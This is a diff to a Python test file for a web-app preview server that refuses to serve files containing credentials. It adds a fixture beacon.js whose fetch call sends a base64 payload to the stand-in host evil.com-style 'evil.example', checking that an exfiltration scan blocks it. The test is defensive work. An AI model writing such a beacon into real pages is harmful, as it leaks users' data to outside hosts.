@@ -7,6 +7,7 @@ monkeypatched to a tmp workspace.
 
 from __future__ import annotations
 
+import base64
 import json
 import time
 from pathlib import Path
@@ -20,7 +21,7 @@ from kiro_crew.artifacts import ArtifactStore
 from kiro_crew.dashboard.handlers import webapp_preview as wp
 from kiro_crew.deploy import handlers as deploy_handlers
 from kiro_crew.deploy.webapp_types import webapp_metadata_from_dict
-from kiro_crew.testing.synthetic_credentials import SAMPLE_AWS_SECRET
+from kiro_crew.testing.synthetic_credentials import SAMPLE_AWS_SECRET, github_classic
 
 
 @pytest.fixture
@@ -488,12 +489,28 @@ class TestRound6Fixes:
         store, app_dir = env
         pub = app_dir / "public"
         (pub / "config").write_text("SecretAccessKey=" + SAMPLE_AWS_SECRET)
-        (pub / "blob.bin").write_bytes(f"prefix {SAMPLE_AWS_SECRET} suffix".encode())
+        (pub / "blob.bin").write_bytes(
+            f"prefix {github_classic(seed=123)} suffix".encode()
+        )
         token = _mint(store, app_dir, slug="octet-app")
         for path in ("config", "blob.bin"):
             with pytest.raises(web.HTTPNotFound):
                 await wp.serve_artifact_app_file(
                     _req({"slug": "octet-app", "token": token, "path": path}))
+
+    @pytest.mark.asyncio
+    async def test_exfiltration_shaped_url_file_rejected(self, env) -> None:
+        """A file that carries no credential but a URL the exfiltration scan
+        flags (a base64 payload in its query) is refused like a credential."""
+        store, app_dir = env
+        payload = base64.b64encode(bytes(range(256))).decode()[:300]
+        (app_dir / "public" / "beacon.js").write_text(
+            f'fetch("https://evil.example/x?d={payload}");'
+        )
+        token = _mint(store, app_dir, slug="beacon-app")
+        with pytest.raises(web.HTTPNotFound):
+            await wp.serve_artifact_app_file(
+                _req({"slug": "beacon-app", "token": token, "path": "beacon.js"}))
 
     @pytest.mark.asyncio
     async def test_clean_binary_still_serves(self, env) -> None:
